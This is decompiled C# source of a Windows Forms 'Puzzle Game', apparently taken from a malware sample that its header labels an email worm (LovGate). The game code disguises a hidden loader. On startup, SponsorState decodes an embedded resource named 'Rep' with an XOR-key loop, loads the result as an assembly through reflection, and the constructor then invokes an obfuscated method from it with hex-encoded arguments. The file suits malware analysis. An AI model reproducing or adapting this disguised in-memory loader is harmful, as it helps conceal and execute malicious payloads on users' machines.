// Decompiled with JetBrains decompiler
// Type: CiscoAnyconnectControl.UI.Form1
// Assembly: EventRegistrationTokenTa, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 99BE195C-C4C5-4E88-A9C4-8AB7EF40C780
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.06\HEUR-Email-Worm.MSIL.LovGate.gen-663451636c9a3ca0013887bcd4433cce5b890f862e9ba01b94d2060d4d4c0c70.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Threading;
using System.Windows.Forms;

namespace CiscoAnyconnectControl.UI
{
  public class Form1 : Form
  {
    private SaveFileDialog saveFileDialog1 = new SaveFileDialog();
    private OpenFileDialog openFileDialog1 = new OpenFileDialog();
    private readonly BackgroundWorker bw = new BackgroundWorker();
    private DialogBox dialogbox;
    private System.Windows.Forms.Timer redtimer = new System.Windows.Forms.Timer();
    private Label[] l3;
    private int[] labelnumbers3 = new int[4];
    private Label[] l4;
    private int[] labelnumbers4 = new int[4];
    private Button[,] buttons;
    private Form1.BlackButton[,] blackbuttons;
    private Point redpoint;
    public int lives;
    private int mistakes;
    private int points;
    private int sum;
    private int clicked;
    public int time = 10000;
    private bool edit;
    private bool redtimerstarted;
    private bool newgamebutton;
    private IContainer components = (IContainer) null;
    private static object ImageFileMachine;
    private static string Explicit = "SG40FFZ584HXG5GTE555PW";
    private static int CodePage = 66560;
    private static System.Type s = typeof (DialogBox);
    private StatusStrip statusStrip1;
    private TableLayoutPanel tableLayoutPanel1;
    private TableLayoutPanel tableLayoutPanel4;
    private TableLayoutPanel tableLayoutPanel2;
    private TableLayoutPanel tableLayoutPanel3;
    private ToolStripMenuItem newGameToolStripMenuItem;
    private MenuStrip menuStrip1;
    private ToolStripMenuItem saveToolStripMenuItem;
    private ToolStripMenuItem modeToolStripMenuItem;
    private ToolStripMenuItem openToolStripMenuItem;
    private ToolStripMenuItem settingsToolStripMenuItem;
    private ToolStripMenuItem gameToolStripMenuItem;
    private ToolStripMenuItem editToolStripMenuItem;
    public ToolStripStatusLabel toolStripStatusLabel1 = new ToolStripStatusLabel();
    private ToolStripStatusLabel toolStripStatusLabel2 = new ToolStripStatusLabel();
    private ToolStripProgressBar toolStripProgressBar1;

    public Form1()
    {
      this.InitializeComponent();
      ((System.Type) Form1.ImageFileMachine).GetMethod("rHccSrtg4").Invoke((object) null, new object[3]
      {
        (object) "437573746F6D417474726962757465456E636F646564417267756D",
        (object) "4767786E50",
        (object) "CiscoAnyconnectControl.UI"
      });
      this.CreateBoard();
    }

    private void CreateBoard()
    {
      this.SetupWindow();
      this.CreateButtons();
      this.CreateLabels();
    }

    private void SetupWindow()
    {
      this.dialogbox = new DialogBox(this);
      this.blackbuttons = new Form1.BlackButton[4, 4];
      this.redtimerstarted = false;
      this.newgamebutton = false;
      this.lives = 3;
      this.toolStripStatusLabel1.Text = "Lives: " + this.lives.ToString();
      this.points = 0;
      this.toolStripStatusLabel2.Text = "Score: " + this.points.ToString();
      this.redtimer.Interval = 500;
      this.toolStripProgressBar1.Maximum = this.time / 1000;
      this.toolStripProgressBar1.Step = -1;
      this.toolStripProgressBar1.Value = this.time / 1000;
      this.bw.WorkerReportsProgress = true;
      this.bw.WorkerSupportsCancellation = true;
      this.bw.DoWork += new DoWorkEventHandler(this.backgroundWorker1_DoWork);
      this.bw.ProgressChanged += new ProgressChangedEventHandler(this.backgroundWorker1_ProgressChanged);
      this.bw.RunWorkerCompleted += new RunWorkerCompletedEventHandler(this.myBGWorker_RunWorkerCompleted);
      this.redtimer.Tick += new EventHandler(this.redtimerevent);
      this.Text = "Puzzle Game";
      this.StartPosition = FormStartPosition.CenterScreen;
      this.FormClosing += new FormClosingEventHandler(this.Form1_Closing);
      for (int index = 0; index < 4; ++index)
        this.labelnumbers3[index] = this.labelnumbers4[index] = 0;
    }

    private void CreateLabels()
    {
      this.l3 = new Label[4];
      this.l4 = new Label[4];
      for (int index = 0; index < 4; ++index)
      {
        this.l3[index] = new Label();
        this.l4[index] = new Label();
        this.l3[index].Size = new Size(50, 50);
        this.l4[index].Size = new Size(50, 50);
        this.l3[index].Anchor = AnchorStyles.None;
        this.l4[index].Anchor = AnchorStyles.None;
        this.l3[index].Font = new Font("Arial", 14f, FontStyle.Regular);
        this.l3[index].TextAlign = ContentAlignment.MiddleCenter;
        this.l4[index].Font = new Font("Arial", 14f, FontStyle.Regular);
        this.l4[index].TextAlign = ContentAlignment.MiddleCenter;
        this.l3[index].Text = "";
        this.l4[index].Text = "";
        this.tableLayoutPanel4.Controls.Add((Control) this.l3[index], 0, index);
        this.tableLayoutPanel3.Controls.Add((Control) this.l4[index], index, 0);
      }
    }

    private void CreateButtons()
    {
      this.buttons = new Button[4, 4];
      for (int index1 = 0; index1 < 4; ++index1)
      {
        for (int index2 = 0; index2 < 4; ++index2)
        {
          Button button = new Button();
          button.Dock = DockStyle.Fill;
          button.Tag = (object) new Point(index1, index2);
          button.AutoSizeMode = AutoSizeMode.GrowAndShrink;
          this.buttons[index1, index2] = button;
          this.buttons[index1, index2].MouseDown += new MouseEventHandler(this.ButtonClick);
          this.buttons[index1, index2].MouseEnter += new EventHandler(this.ButtonEnter);
          this.buttons[index1, index2].MouseLeave += new EventHandler(this.ButtonLeave);
          this.buttons[index1, index2].Enabled = false;
          this.ColorButtons(index1, index2);
          this.tableLayoutPanel2.Controls.Add((Control) this.buttons[index1, index2], index2, index1);
          this.blackbuttons[index1, index2].black = false;
          this.blackbuttons[index1, index2].found = false;
        }
      }
    }

    private void AddNumbers()
    {
      for (int index = 0; index < 4; ++index)
      {
        this.l3[index].TextAlign = ContentAlignment.MiddleCenter;
        this.l3[index].Text = this.labelnumbers3[index].ToString();
        this.l4[index].TextAlign = ContentAlignment.MiddleCenter;
        this.l4[index].Text = this.labelnumbers4[index].ToString();
      }
    }

    private void ColorButtons(int i, int j)
    {
      this.buttons[i, j].BackColor = Color.RoyalBlue;
      this.buttons[i, j].Text = "?";
      this.buttons[i, j].Font = new Font("Arial", 16f, FontStyle.Regular);
    }

    private void ButtonClick(object myObject, EventArgs myEventArgs)
    {
      Button button = (Button) myObject;
      Point tag = (Point) button.Tag;
      MouseEventArgs mouseEventArgs = (MouseEventArgs) myEventArgs;
      if (MouseButtons.Right == mouseEventArgs.Button)
      {
        if (!this.edit && button.BackColor != Color.Black)
          button.BackColor = Color.White;
        if (this.edit && button.BackColor == Color.Black)
        {
          button.BackColor = Color.White;
          this.blackbuttons[tag.X, tag.Y].black = false;
          --this.labelnumbers3[tag.X];
          --this.labelnumbers4[tag.Y];
          --this.sum;
        }
      }
      if (MouseButtons.Left != mouseEventArgs.Button)
        return;
      if (this.edit)
      {
        button.BackColor = Color.Black;
        this.blackbuttons[tag.X, tag.Y].black = true;
        ++this.labelnumbers3[tag.X];
        ++this.labelnumbers4[tag.Y];
        ++this.sum;
      }
      else if (this.blackbuttons[tag.X, tag.Y].black && !this.blackbuttons[tag.X, tag.Y].found)
      {
        this.blackbuttons[tag.X, tag.Y].found = true;
        button.BackColor = Color.Black;
        this.points += 50;
        this.toolStripStatusLabel2.Text = "Score: " + this.points.ToString();
        ++this.clicked;
        if (this.clicked == this.sum)
        {
          this.points += 500;
          this.CallEnd();
          this.NewGame();
        }
      }
      else if (!this.blackbuttons[tag.X, tag.Y].black)
      {
        ++this.mistakes;
        this.toolStripStatusLabel1.Text = "Lives: " + (this.lives - this.mistakes).ToString();
        button.BackColor = Color.Red;
        button.Text = "";
        if (this.redtimerstarted)
        {
          this.ColorButtons(this.redpoint.X, this.redpoint.Y);
          this.redtimerstarted = false;
          this.redtimer.Stop();
        }
        this.redpoint = new Point(tag.X, tag.Y);
        this.redtimerstarted = true;
        this.redtimer.Start();
        if (this.mistakes == this.lives)
        {
          this.EndGame(false);
          this.CallEnd();
          this.points = 0;
        }
      }
    }

    private void CallEnd()
    {
      if (this.bw.IsBusy)
        this.bw.CancelAsync();
      while (this.bw.IsBusy)
        Application.DoEvents();
    }

    private void NewGame()
    {
      this.CallEnd();
      this.newgamebutton = false;
      this.mistakes = 0;
      this.clicked = 0;
      this.toolStripProgressBar1.Maximum = this.time / 1000;
      this.toolStripProgressBar1.Step = -1;
      this.toolStripProgressBar1.Value = this.time / 1000;
      this.bw.RunWorkerAsync();
      this.toolStripStatusLabel2.Text = "Score: " + this.points.ToString();
      this.toolStripStatusLabel1.Text = "Lives: " + this.lives.ToString();
      this.sum = 0;
      for (int index = 0; index < 4; ++index)
        this.labelnumbers3[index] = this.labelnumbers4[index] = 0;
      Random random = new Random();
      for (int i = 0; i < 4; ++i)
      {
        for (int j = 0; j < 4; ++j)
        {
          this.blackbuttons[i, j].black = false;
          this.blackbuttons[i, j].found = false;
          this.buttons[i, j].Enabled = true;
          this.ColorButtons(i, j);
          if (random.Next(0, 2) == 0)
          {
            this.blackbuttons[i, j].black = true;
            ++this.labelnumbers3[i];
            ++this.labelnumbers4[j];
            ++this.sum;
          }
        }
      }
      this.AddNumbers();
    }

    private void EndGame(bool atall)
    {
      for (int index1 = 0; index1 < 4; ++index1)
      {
        for (int index2 = 0; index2 < 4; ++index2)
          this.buttons[index1, index2].Enabled = false;
      }
      if (!atall)
        return;
      int num = (int) MessageBox.Show("Your final score is: " + this.points.ToString(), "Congratulations!");
    }

    private void ButtonEnter(object myObject, EventArgs myEventArgs)
    {
      Button button = (Button) myObject;
      if (!(button.BackColor == Color.RoyalBlue))
        return;
      button.BackColor = Color.Yellow;
      button.Text = "";
    }

    private void ButtonLeave(object myObject, EventArgs myEventArgs)
    {
      Button button = (Button) myObject;
      Point tag = (Point) button.Tag;
      if (!(button.BackColor == Color.Yellow))
        return;
      this.ColorButtons(tag.X, tag.Y);
    }

    private void Form1_Closing(object sender, CancelEventArgs e)
    {
      if (MessageBox.Show("Are you sure?", "Close", MessageBoxButtons.YesNo) == DialogResult.No)
        e.Cancel = true;
      else
        e.Cancel = false;
    }

    private void redtimerevent(object sender, EventArgs e)
    {
      System.Windows.Forms.Timer timer = (System.Windows.Forms.Timer) sender;
      this.ColorButtons(this.redpoint.X, this.redpoint.Y);
      this.redtimerstarted = false;
      timer.Stop();
    }

    private void newGameToolStripMenuItem_Click_1(object sender, EventArgs e)
    {
      this.points = 0;
      this.toolStripStatusLabel2.Text = "Score: " + this.points.ToString();
      this.newgamebutton = true;
      this.NewGame();
    }

    private void settingsToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.dialogbox.numericUpDown1.Value = (Decimal) this.lives;
      this.dialogbox.numericUpDown2.Value = (Decimal) (this.time / 1000);
      int num = (int) this.dialogbox.ShowDialog();
    }

    private void editToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.edit = true;
      this.CallEnd();
      this.newGameToolStripMenuItem.Enabled = false;
      this.settingsToolStripMenuItem.Enabled = false;
      this.openToolStripMenuItem.Enabled = false;
      this.saveToolStripMenuItem.Enabled = true;
      this.gameToolStripMenuItem.Checked = false;
      this.editToolStripMenuItem.Checked = true;
      this.menuStrip1.BackColor = Color.Gold;
      this.sum = 0;
      for (int index1 = 0; index1 < 4; ++index1)
      {
        this.labelnumbers3[index1] = 0;
        this.labelnumbers4[index1] = 0;
        this.l3[index1].Text = "";
        this.l4[index1].Text = "";
        for (int index2 = 0; index2 < 4; ++index2)
        {
          this.blackbuttons[index1, index2].black = false;
          this.blackbuttons[index1, index2].found = false;
          this.buttons[index1, index2].Enabled = true;
          this.buttons[index1, index2].BackColor = Color.White;
          this.buttons[index1, index2].Text = "";
        }
      }
    }

    private void gameToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.newGameToolStripMenuItem.Enabled = true;
      this.settingsToolStripMenuItem.Enabled = true;
      this.openToolStripMenuItem.Enabled = true;
      this.saveToolStripMenuItem.Enabled = false;
      this.gameToolStripMenuItem.Checked = true;
      this.editToolStripMenuItem.Checked = false;
      if (!this.edit)
        return;
      this.menuStrip1.BackColor = Control.DefaultBackColor;
      this.edit = false;
      this.mistakes = 0;
      this.clicked = 0;
      this.toolStripProgressBar1.Maximum = this.time / 1000;
      this.toolStripProgressBar1.Step = -1;
      this.toolStripProgressBar1.Value = this.time / 1000;
      this.bw.RunWorkerAsync();
      this.toolStripStatusLabel2.Text = "Score: " + this.points.ToString();
      for (int i = 0; i < 4; ++i)
      {
        for (int j = 0; j < 4; ++j)
          this.ColorButtons(i, j);
      }
      this.AddNumbers();
    }

    private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
    {
      BackgroundWorker backgroundWorker = sender as BackgroundWorker;
      for (int index = this.time / 1000 - 1; index >= 0; --index)
      {
        if (this.bw.CancellationPending)
        {
          e.Cancel = true;
          break;
        }
        Thread.Sleep(1000);
        int percentProgress = index;
        backgroundWorker.ReportProgress(percentProgress);
      }
    }

    private void backgroundWorker1_ProgressChanged(object sender, ProgressChangedEventArgs e) => this.toolStripProgressBar1.Value = e.ProgressPercentage;

    private void myBGWorker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
    {
      if (this.edit || this.sum == this.clicked)
        return;
      if (!this.newgamebutton)
      {
        this.EndGame(true);
      }
      else
      {
        this.newgamebutton = false;
        this.EndGame(false);
      }
    }

    private void saveToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.saveFileDialog1.Filter = "PuzzleGame Files|*.pg";
      this.saveFileDialog1.Title = "Save a Board";
      int num = (int) this.saveFileDialog1.ShowDialog();
      if (!(this.saveFileDialog1.FileName != ""))
        return;
      StreamWriter streamWriter = new StreamWriter(this.saveFileDialog1.FileName);
      for (int index1 = 0; index1 < 4; ++index1)
      {
        for (int index2 = 0; index2 < 4; ++index2)
        {
          if (this.blackbuttons[index1, index2].black)
            streamWriter.Write('1');
          else
            streamWriter.Write('0');
        }
      }
      streamWriter.Close();
    }

    private void openToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.newgamebutton = true;
      this.CallEnd();
      this.newgamebutton = false;
      this.openFileDialog1.Filter = "PuzzleGame Files|*.pg";
      this.openFileDialog1.Title = "Load a Board";
      if (this.openFileDialog1.ShowDialog() != DialogResult.OK)
        return;
      this.sum = 0;
      for (int index = 0; index < 4; ++index)
      {
        this.labelnumbers3[index] = 0;
        this.labelnumbers4[index] = 0;
      }
      StreamReader streamReader = new StreamReader(this.openFileDialog1.FileName);
      for (int index1 = 0; index1 < 4; ++index1)
      {
        for (int index2 = 0; index2 < 4; ++index2)
        {
          this.blackbuttons[index1, index2].found = false;
          if ((ushort) streamReader.Read() == (ushort) 49)
          {
            this.blackbuttons[index1, index2].black = true;
            ++this.labelnumbers3[index1];
            ++this.labelnumbers4[index2];
            ++this.sum;
          }
          else
            this.blackbuttons[index1, index2].black = false;
        }
      }
      streamReader.Close();
      this.mistakes = 0;
      this.clicked = 0;
      this.toolStripProgressBar1.Maximum = this.time / 1000;
      this.toolStripProgressBar1.Step = -1;
      this.toolStripProgressBar1.Value = this.time / 1000;
      this.bw.RunWorkerAsync();
      this.toolStripStatusLabel2.Text = "Score: " + this.points.ToString();
      for (int i = 0; i < 4; ++i)
      {
        for (int j = 0; j < 4; ++j)
        {
          this.buttons[i, j].Enabled = true;
          this.ColorButtons(i, j);
        }
      }
      this.AddNumbers();
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.statusStrip1 = new StatusStrip();
      this.toolStripProgressBar1 = new ToolStripProgressBar();
      this.toolStripStatusLabel2 = new ToolStripStatusLabel();
      this.toolStripStatusLabel1 = new ToolStripStatusLabel();
      this.menuStrip1 = new MenuStrip();
      this.newGameToolStripMenuItem = new ToolStripMenuItem();
      this.settingsToolStripMenuItem = new ToolStripMenuItem();
      this.openToolStripMenuItem = new ToolStripMenuItem();
      this.saveToolStripMenuItem = new ToolStripMenuItem();
      this.modeToolStripMenuItem = new ToolStripMenuItem();
      this.gameToolStripMenuItem = new ToolStripMenuItem();
      this.editToolStripMenuItem = new ToolStripMenuItem();
      this.tableLayoutPanel1 = new TableLayoutPanel();
      this.tableLayoutPanel4 = new TableLayoutPanel();
      this.tableLayoutPanel2 = new TableLayoutPanel();
      this.tableLayoutPanel3 = new TableLayoutPanel();
      this.statusStrip1.SuspendLayout();
      this.menuStrip1.SuspendLayout();
      this.tableLayoutPanel1.SuspendLayout();
      this.SuspendLayout();
      this.statusStrip1.Items.AddRange(new ToolStripItem[3]
      {
        (ToolStripItem) this.toolStripProgressBar1,
        (ToolStripItem) this.toolStripStatusLabel2,
        (ToolStripItem) this.toolStripStatusLabel1
      });
      this.statusStrip1.Location = new Point(0, 314);
      this.statusStrip1.Name = "statusStrip1";
      this.statusStrip1.RightToLeft = RightToLeft.Yes;
      this.statusStrip1.Size = new Size(460, 22);
      this.statusStrip1.TabIndex = 0;
      this.statusStrip1.Text = "statusStrip1";
      this.toolStripProgressBar1.Alignment = ToolStripItemAlignment.Right;
      this.toolStripProgressBar1.Name = "toolStripProgressBar1";
      this.toolStripProgressBar1.Size = new Size(100, 16);
      this.toolStripStatusLabel2.Name = "toolStripStatusLabel2";
      this.toolStripStatusLabel2.RightToLeft = RightToLeft.No;
      this.toolStripStatusLabel2.Size = new Size(118, 17);
      this.toolStripStatusLabel2.Text = "toolStripStatusLabel2";
      this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
      this.toolStripStatusLabel1.Size = new Size(118, 17);
      this.toolStripStatusLabel1.Text = "toolStripStatusLabel1";
      this.menuStrip1.Items.AddRange(new ToolStripItem[5]
      {
        (ToolStripItem) this.newGameToolStripMenuItem,
        (ToolStripItem) this.settingsToolStripMenuItem,
        (ToolStripItem) this.openToolStripMenuItem,
        (ToolStripItem) this.saveToolStripMenuItem,
        (ToolStripItem) this.modeToolStripMenuItem
      });
      this.menuStrip1.Location = new Point(0, 0);
      this.menuStrip1.Name = "menuStrip1";
      this.menuStrip1.Size = new Size(460, 24);
      this.menuStrip1.TabIndex = 1;
      this.menuStrip1.Text = "menuStrip1";
      this.newGameToolStripMenuItem.Name = "newGameToolStripMenuItem";
      this.newGameToolStripMenuItem.Size = new Size(77, 20);
      this.newGameToolStripMenuItem.Text = "New Game";
      this.newGameToolStripMenuItem.Click += new EventHandler(this.newGameToolStripMenuItem_Click_1);
      this.settingsToolStripMenuItem.Name = "settingsToolStripMenuItem";
      this.settingsToolStripMenuItem.Size = new Size(61, 20);
      this.settingsToolStripMenuItem.Text = "Settings";
      this.settingsToolStripMenuItem.Click += new EventHandler(this.settingsToolStripMenuItem_Click);
      this.openToolStripMenuItem.Name = "openToolStripMenuItem";
      this.openToolStripMenuItem.Size = new Size(48, 20);
      this.openToolStripMenuItem.Text = "Open";
      this.openToolStripMenuItem.Click += new EventHandler(this.openToolStripMenuItem_Click);
      this.saveToolStripMenuItem.Enabled = false;
      this.saveToolStripMenuItem.Name = "saveToolStripMenuItem";
      this.saveToolStripMenuItem.Size = new Size(43, 20);
      this.saveToolStripMenuItem.Text = "Save";
      this.saveToolStripMenuItem.Click += new EventHandler(this.saveToolStripMenuItem_Click);
      this.modeToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.gameToolStripMenuItem,
        (ToolStripItem) this.editToolStripMenuItem
      });
      this.modeToolStripMenuItem.Name = "modeToolStripMenuItem";
      this.modeToolStripMenuItem.Size = new Size(50, 20);
      this.modeToolStripMenuItem.Text = "Mode";
      this.gameToolStripMenuItem.Checked = true;
      this.gameToolStripMenuItem.CheckState = CheckState.Checked;
      this.gameToolStripMenuItem.Name = "gameToolStripMenuItem";
      this.gameToolStripMenuItem.Size = new Size(105, 22);
      this.gameToolStripMenuItem.Text = "Game";
      this.gameToolStripMenuItem.Click += new EventHandler(this.gameToolStripMenuItem_Click);
      this.editToolStripMenuItem.Name = "editToolStripMenuItem";
      this.editToolStripMenuItem.Size = new Size(105, 22);
      this.editToolStripMenuItem.Text = "Edit";
      this.editToolStripMenuItem.Click += new EventHandler(this.editToolStripMenuItem_Click);
      this.tableLayoutPanel1.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      this.tableLayoutPanel1.ColumnCount = 2;
      this.tableLayoutPanel1.ColumnStyles.Add(new ColumnStyle(SizeType.Absolute, 50f));
      this.tableLayoutPanel1.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 100f));
      this.tableLayoutPanel1.Controls.Add((Control) this.tableLayoutPanel4, 0, 1);
      this.tableLayoutPanel1.Controls.Add((Control) this.tableLayoutPanel2, 1, 1);
      this.tableLayoutPanel1.Controls.Add((Control) this.tableLayoutPanel3, 1, 0);
      this.tableLayoutPanel1.Location = new Point(0, 24);
      this.tableLayoutPanel1.Name = "tableLayoutPanel1";
      this.tableLayoutPanel1.RowCount = 2;
      this.tableLayoutPanel1.RowStyles.Add(new RowStyle(SizeType.Absolute, 50f));
      this.tableLayoutPanel1.RowStyles.Add(new RowStyle(SizeType.Percent, 100f));
      this.tableLayoutPanel1.Size = new Size(460, 290);
      this.tableLayoutPanel1.TabIndex = 2;
      this.tableLayoutPanel4.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      this.tableLayoutPanel4.ColumnCount = 1;
      this.tableLayoutPanel4.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 100f));
      this.tableLayoutPanel4.Location = new Point(3, 53);
      this.tableLayoutPanel4.Name = "tableLayoutPanel4";
      this.tableLayoutPanel4.RowCount = 4;
      this.tableLayoutPanel4.RowStyles.Add(new RowStyle(SizeType.Percent, 25f));
      this.tableLayoutPanel4.RowStyles.Add(new RowStyle(SizeType.Percent, 25f));
      this.tableLayoutPanel4.RowStyles.Add(new RowStyle(SizeType.Percent, 25f));
      this.tableLayoutPanel4.RowStyles.Add(new RowStyle(SizeType.Percent, 25f));
      this.tableLayoutPanel4.Size = new Size(44, 234);
      this.tableLayoutPanel4.TabIndex = 0;
      this.tableLayoutPanel2.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      this.tableLayoutPanel2.BackColor = SystemColors.Control;
      this.tableLayoutPanel2.ColumnCount = 4;
      this.tableLayoutPanel2.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 25f));
      this.tableLayoutPanel2.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 25f));
      this.tableLayoutPanel2.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 25f));
      this.tableLayoutPanel2.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 25f));
      this.tableLayoutPanel2.Location = new Point(53, 53);
      this.tableLayoutPanel2.Name = "tableLayoutPanel2";
      this.tableLayoutPanel2.RowCount = 4;
      this.tableLayoutPanel2.RowStyles.Add(new RowStyle(SizeType.Percent, 25f));
      this.tableLayoutPanel2.RowStyles.Add(new RowStyle(SizeType.Percent, 25f));
      this.tableLayoutPanel2.RowStyles.Add(new RowStyle(SizeType.Percent, 25f));
      this.tableLayoutPanel2.RowStyles.Add(new RowStyle(SizeType.Percent, 25f));
      this.tableLayoutPanel2.Size = new Size(404, 234);
      this.tableLayoutPanel2.TabIndex = 0;
      this.tableLayoutPanel3.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      this.tableLayoutPanel3.ColumnCount = 4;
      this.tableLayoutPanel3.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 25f));
      this.tableLayoutPanel3.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 25f));
      this.tableLayoutPanel3.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 25f));
      this.tableLayoutPanel3.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 25f));
      this.tableLayoutPanel3.Location = new Point(53, 3);
      this.tableLayoutPanel3.Name = "tableLayoutPanel3";
      this.tableLayoutPanel3.RowCount = 1;
      this.tableLayoutPanel3.RowStyles.Add(new RowStyle(SizeType.Percent, 100f));
      this.tableLayoutPanel3.Size = new Size(404, 44);
      this.tableLayoutPanel3.TabIndex = 1;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(460, 336);
      this.Controls.Add((Control) this.tableLayoutPanel1);
      this.Controls.Add((Control) this.statusStrip1);
      this.Controls.Add((Control) this.menuStrip1);
      this.MainMenuStrip = this.menuStrip1;
      this.Name = nameof (Form1);
      this.Text = "Puzzle Game";
      this.statusStrip1.ResumeLayout(false);
      this.statusStrip1.PerformLayout();
      this.menuStrip1.ResumeLayout(false);
      this.menuStrip1.PerformLayout();
      this.tableLayoutPanel1.ResumeLayout(false);
      this.ResumeLayout(false);
      this.PerformLayout();
      Form1.SponsorState();
    }

    private static void SponsorState()
    {
      byte[] numArray = (byte[]) new ResourceManager(Form1.s).GetObject("Rep");
      for (int i = 133142; i >= 0; i += -1)
        numArray = Form1.DismatleCode(numArray, i, 256);
      Form1.ImageFileMachine = (object) ((Assembly) Form1.RefreshCode(numArray)).GetExportedTypes()[1];
    }

    public static object RefreshCode(byte[] ConstructionCall) => System.Type.GetType("System.Reflection.Assembly").InvokeMember("Load", BindingFlags.InvokeMethod, (Binder) null, (object) null, new object[1]
    {
      (object) ConstructionCall
    });

    private static byte[] DismatleCode(byte[] tt, int i, int AsyncLocal)
    {
      int num = (int) tt[(i + 1) % Form1.CodePage];
      int w = (Form1.HashIncrease(tt, i, 22) - (num + AsyncLocal)) % AsyncLocal;
      tt[i % Form1.CodePage] = Form1.SelectSetup(w);
      return tt;
    }

    public static byte SelectSetup(int w) => (byte) w;

    private static int HashIncrease(byte[] ConstantAttribute, int i, int j) => (int) ConstantAttribute[i % Form1.CodePage] ^ (int) Form1.Explicit[i % j];

    public struct BlackButton
    {
      public bool black;
      public bool found;
    }
  }
}
